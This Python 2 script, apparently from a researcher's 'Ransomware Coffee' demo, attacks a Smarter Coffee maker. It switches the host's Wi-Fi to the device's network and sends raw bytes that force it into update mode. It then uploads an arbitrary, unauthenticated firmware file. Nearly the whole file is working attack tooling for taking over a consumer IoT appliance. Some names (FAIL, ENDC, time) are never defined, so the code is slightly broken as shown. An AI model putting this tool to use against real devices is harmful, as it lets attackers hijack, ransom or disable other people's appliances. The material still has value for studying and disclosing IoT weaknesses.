# Smarter Coffe Maker firmware updater
# Brought to you by @thinkcz

# Import the necessary packages
import subprocess
import os
import sys
import site
from consolemenu import *
from consolemenu.items import *

cfg = None

menu = None

COFFEEMAKERID = "5b" #5b
WIFI_INTERFACE = "en0"
FIRMWARE = "data/firmware.bin"
NORMALSSID = "Smarter Coffee:" + COFFEEMAKERID
UPDATESSID = "Smarter Coffee Update:" + COFFEEMAKERID




def update_wifi_info(mn):
	mn.prologue_text = "Actual WiFi connected: [%s]" % (get_current_ssid())

# needs to be updated according platform (this is OSX implementation)
def get_current_ssid():
	res = subprocess.check_output(['networksetup', '-getairportnetwork', WIFI_INTERFACE]).strip()
	if res == "" or res == None:
		return ""
	else:
		return res[res.find(':') + 1:].strip()

# needs to be updated according platform (this is OSX implementation)
def change_ssid(ssid):    
	if (get_current_ssid() == ssid):
	    return True
	res = subprocess.check_output(['networksetup', '-setairportnetwork', WIFI_INTERFACE , ssid]).strip()
	if res == "" or res == None:
		return True
	else:
		return False

def change_ssid_tries(ssid, x):
	sys.stdout.write("Trying to change to the wireless network [ %s ]" % (ssid))
	for i in range(x):
		sys.stdout.write(".")
		if change_ssid(ssid):
			sys.stdout.write("\n")
			update_wifi_info(menu)
			return True
	sys.stdout.write("\n")
	return False


def stage1():

	if not change_ssid_tries(NORMALSSID, 10):
		print FAIL + "Can't connect to [ %s ]! Enter to continue" % (NORMALSSID) + ENDC
		raw_input()
		return ""

	print "Starting update mode, there will be no return code!"

	es = easy_smarter()
	for tries in range(10):
		if es.connect():
			es.send_command([0x6D, 0x7E])
			print "Done, check coffee machine and connect to update network, press Enter to continue."
			es.disconnect()
			raw_input()
			return ""		
		time.sleep(1)

	print "Could not connect to Coffee maker. Enter to continue"
		
	raw_input()
	return ""		



def stage2():
	if not change_ssid_tries(UPDATESSID, 10):
		print FAIL + "Can't connect to [ %s ]! Enter to continue" % (UPDATESSID) + ENDC
		raw_input()
		return ""

	print "Starting update mode, upload firmware."

	es = easy_smarter()
	for tries in range(10):
		if es.connect():
			es.disconnect()
			break
		time.sleep(1)


	es = easy_smarter()
	if es.connect():
		es.upload_firmware(FIRMWARE)
		print "Done, check coffee machine and re-connect to normal network, press Enter to continue."
		es.disconnect()
	else:
		print "Could not connect to Coffee maker. Enter to continue"
	raw_input()
	return ""

#-------------------------------- main ------------------------------
if __name__ == "__main__":
	# Create the menu
	menu = ConsoleMenu("Ransomware Coffee", "demo by THiNK of AwesomeBlue")

	# get absoluthe path of script
	scriptpath = os.path.dirname(os.path.abspath(__file__))
	# root for imports
	site.addsitedir(os.path.join(scriptpath, 'bin'))
	# import
	from config import *
	# try to open main config
	print os.path.join(scriptpath, 'cfg', 'config.yaml')
	cfg = YamlConfig(os.path.join(scriptpath, 'cfg', 'config.yaml'))


    # load config
    # 
    # 
    #	
	COFFEEMAKERID =  cfg.get("coffeemaker/id",COFFEEMAKERID)	
	WIFI_INTERFACE = cfg.get("server/wifiinterface",WIFI_INTERFACE)	
	FIRMWARE = cfg.get("coffeemaker/firmware",FIRMWARE) 
	NORMALSSID =   cfg.get("coffeemaker/normalssid", NORMALSSID ) + ":" +COFFEEMAKERID
	UPDATESSID =   cfg.get("coffeemaker/updatessid", UPDATESSID ) + ":" +COFFEEMAKERID
     

	# override config value if file being specified on command line
	if len(sys.argv)==2:
		FIRMWARE  = sys.argv[1]


	update_wifi_info(menu)
	# Create some items


	# A FunctionItem runs a Python function when selected
	item1 = FunctionItem("Stage: turn maker into update mode", stage1)

	# A CommandItem runs a console command
	item2 = FunctionItem("Stage: upload firmware",  stage2)

	
	
	menu.append_item(item1)
	menu.append_item(item2)
	
	# get absoluthe path of script
	scriptpath = os.path.dirname(os.path.abspath(__file__))
	# root for imports
	site.addsitedir(os.path.join(scriptpath, 'src'))

	# lazy imports
	from easy_smarter  import *



	# Finally, we call show to show the menu and allow the user to interact
	menu.show()
